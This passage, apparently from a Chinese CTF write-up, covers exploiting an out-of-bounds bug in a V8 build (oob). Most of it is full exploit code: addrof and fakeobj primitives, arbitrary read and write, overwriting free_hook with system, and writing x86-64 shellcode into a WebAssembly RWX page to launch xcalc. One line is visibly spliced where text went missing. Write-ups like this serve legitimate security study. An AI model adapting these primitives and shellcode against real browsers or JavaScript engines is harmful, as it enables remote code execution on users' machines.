    let fprintf_got = 0xd9a3a0+elf_base;
    let libcbase = arbRead(fprintf_got) - 0x64eb0;
    console.log("[*]libcbase ==> "+hex(libcbase));
然后我们把free_hook盖成system（盖成onegadget没有什么意义，不如system执行一些命令），再随便释放一个带有指令的堆块，使用console.log就能做到
    let systemaddr = libcbase + 0x000000000004F550;
    let freehook = libcbase + 0x3ed8e8;
    arbWrite(freehook,systemaddr);
    //%SystemBreak();
    console.log('xcalc');
这个方法虽然简单，但它有几个问题  
1、弹完计算器之后它还会free别的很多堆块，你不能保证free的时候freehook不会导致什么问题，而且控制台会一直弹字符，比较难看。  
2、在现实情况下，v8是开了沙箱的，我们达到命令执行之后通常还得做逃逸，如果是直接盖free_hook会导致后面逃逸的部分不好搞
基于这两个问题，一般情况下我们选择第二种方法来利用
###  写入shellcode
如果能执行shellcode，那我们可以做的事情就比只用system多一点。  
写入shellcode的思路大体上就是开一块RWX的区域，然后往里写shellcode执行。这里我们使用webasm的方法来执行。老版本好像还有直接改JIT优化的代码区这种操作，但现在不行，本题中也不涉及JIT。
v8提供WebAssembly这种对象让我们能写wasm来产生一个函数。但是这个对象在生成底层代码的时候是会检查的，会阻止你传入那些系统函数，于是就需要我们在它生成完底层代码之后往它开的RWX页里写我们自己的shellcode，注意这里的shellcode要用wasm写。  
利用代码如下：
    let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    let wasm_mod = new WebAssembly.Module(wasm_code);
    let wasm_instance = new WebAssembly.Instance(wasm_mod);
    let f = wasm_instance.exports.main;
    let rwx_page_addr = arbRead(addrof(wasm_instance)-1+0x88);
    console.log("[+]RWX Wasm page addr: " + hex(rwx_page_addr));
    function copy_shellcode(addr, shellcode) 
    {
        let buf = new ArrayBuffer(0x100);
        let dataview = new DataView(buf);
        let buf_addr = addrof(buf);
        let backing_store_addr = buf_addr + 0x20;
        backstoreWrite(backing_store_addr, addr);
        for (let i = 0; i  "+hex(libcbase));
    let systemaddr = libcbase + 0x000000000004F550;
    let freehook = libcbase + 0x3ed8e8;
    arbWrite(freehook,systemaddr);
    console.log('xcalc');
###  shellcode版
    function hex(i)
    {
        return '0x'+i.toString(16).padStart(16, "0");
    }
    const MAX_ITERATIONS = 10000;
    class Memory{
        constructor(){
            this.buf = new ArrayBuffer(8);
            this.f64 = new Float64Array(this.buf);
            this.u32 = new Uint32Array(this.buf);
            this.bytes = new Uint8Array(this.buf);
        }
        f2i(val){
            this.f64[0] = val;
            let tmp = Array.from(this.u32);
            return tmp[1] * 0x100000000 + tmp[0];
        }
        i2f(val){
            let tmp = [];
            tmp[0] = parseInt(val % 0x100000000);
            tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
            this.u32.set(tmp);
            return this.f64[0];
        }
    }
    let mem = new Memory();
    let float_array = [1.1,2.2,3.3,4.4];
    let obj = {'a':1.1};
    let obj_array = [obj];
    let float_map = float_array.oob()
    let obj_map = obj_array.oob();
    let maxSize = 1028 * 8;
    function addrof(obj)
    {
      obj_array[0] = obj;
      obj_array.oob(float_map);
      let addr = mem.f2i(obj_array[0])
      obj_array.oob(obj_map);
      return addr;
    }
    function fakeobj(addr)
    {
      float_array[0] = mem.i2f(addr);
      float_array.oob(obj_map);
      let fake = float_array[0];
      float_array.oob(float_map);
      return fake;
    }
    let arb_Buffer = [float_map,1.1,2.2,3.3];
    function arbRead(addr)
    {
      if (addr % 2 == 0) 
      {
        addr += 1;
      }
      let OBJ = fakeobj(addrof(arb_Buffer)-0x20);
      arb_Buffer[2] = mem.i2f(addr - 0x10);
      let result = mem.f2i(OBJ[0]);
      console.log("[*]value at "+hex(addr)+" is "+hex(result));
      return result;
    }
    function backstoreWrite(addr,value)
    {
      let OBJ = fakeobj(addrof(arb_Buffer)-0x20);
      arb_Buffer[2] = mem.i2f(addr - 0x10);
      OBJ[0] = mem.i2f(value);
    }
    function arbWrite(addr,value)
    {
      let buf = new ArrayBuffer(8);
      let view = new DataView(buf);
      let backingsotre = addrof(buf)+0x20;
      backstoreWrite(backingsotre,addr);
      view.setBigInt64(0,BigInt(value),true);
    }
    let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    let wasm_mod = new WebAssembly.Module(wasm_code);
    let wasm_instance = new WebAssembly.Instance(wasm_mod);
    let f = wasm_instance.exports.main;
    let rwx_page_addr = arbRead(addrof(wasm_instance)-1+0x88);
    console.log("[+]RWX Wasm page addr: " + hex(rwx_page_addr));
    function copy_shellcode(addr, shellcode) 
    {
        let buf = new ArrayBuffer(0x100);
        let dataview = new DataView(buf);
        let buf_addr = addrof(buf);
        let backing_store_addr = buf_addr + 0x20;
        backstoreWrite(backing_store_addr, addr);
        for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint32(4*i, shellcode[i], true);
        }
    }
    let shellcode=[0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
    console.log("[+]Copying shellcode to RWX page");
    copy_shellcode(rwx_page_addr, shellcode);
    console.log("[+]Popping calculator");
    f();